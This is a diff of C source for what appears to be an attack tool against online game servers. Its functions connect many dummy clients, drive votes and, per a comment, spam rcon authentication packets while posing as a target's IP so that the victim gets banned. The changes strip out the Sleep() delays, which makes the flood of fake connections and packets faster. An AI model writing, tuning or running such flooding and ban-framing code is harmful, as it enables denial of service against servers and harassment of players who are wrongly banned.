@@ -240,8 +240,6 @@ void ConnectDummies(const char *IP, int Port, int Amount, int Vote)
 	{
 		if (!Create(&m_Sock[i]))
 			Close(i);
-
-		Sleep(10);
 	}
 
 	for (int k = 0; k < Amount; k++)
@@ -266,35 +264,30 @@ void ConnectDummies(const char *IP, int Port, int Amount, int Vote)
 		ZeroMemory(buffer, sizeof(buffer));
 		BufferSize = PackConnect(&buffer[0], j);
 		SendData((const char*)buffer, BufferSize, j);
-		Sleep(20);
 
 		//Debug(&buffer[0], BufferSize);
 
 		ZeroMemory(buffer, sizeof(buffer));
 		BufferSize = PackClientInfo(&buffer[0], j);
 		SendData((const char*)buffer, BufferSize, j);
-		Sleep(20);
 
 		//Debug(&buffer[0], BufferSize);
 
 		ZeroMemory(buffer, sizeof(buffer));
 		BufferSize = PackReady(&buffer[0], j);
 		SendData((const char*)buffer, BufferSize, j);
-		Sleep(20);
 
 		//Debug(&buffer[0], BufferSize);
 
 		ZeroMemory(buffer, sizeof(buffer));
 		BufferSize = PackSendInfo(&buffer[0], j);
 		SendData((const char*)buffer, BufferSize, j);
-		Sleep(20);
 
 		//Debug(&buffer[0], BufferSize);
 
 		ZeroMemory(buffer, sizeof(buffer));
 		BufferSize = PackEnterGame(&buffer[0], j);
 		SendData((const char*)buffer, BufferSize, j);
-		Sleep(20);
 
 		//Debug(&buffer[0], BufferSize);
 
@@ -302,7 +295,6 @@ void ConnectDummies(const char *IP, int Port, int Amount, int Vote)
 		ZeroMemory(buffer, 2048);
 		BufferSize = PackKeepAlive(&buffer[0], j);
 		SendData((const char*)buffer, BufferSize, j);
-		Sleep(20);
 
 		//Debug(&buffer[0], BufferSize);
 
@@ -348,7 +340,7 @@ void VoteBot(const char *IP, int Port, int Amount, int v)
  *** We don't need the targets port for this exploit, we just connect a
  *** dummy with the target's ip and spam rcon auth packets. This will get his
  *** whole ip banned. For this procedere we don't need to connect fully, means
- *** if we dont send the READY packet it will still work, but the dummy won't
+ *** if we don't send the READY packet it will still work, but the dummy won't
  *** actually apear ingame.
 */
 void RconBan(const char *SrvIP, int Port, const char *BanIP)
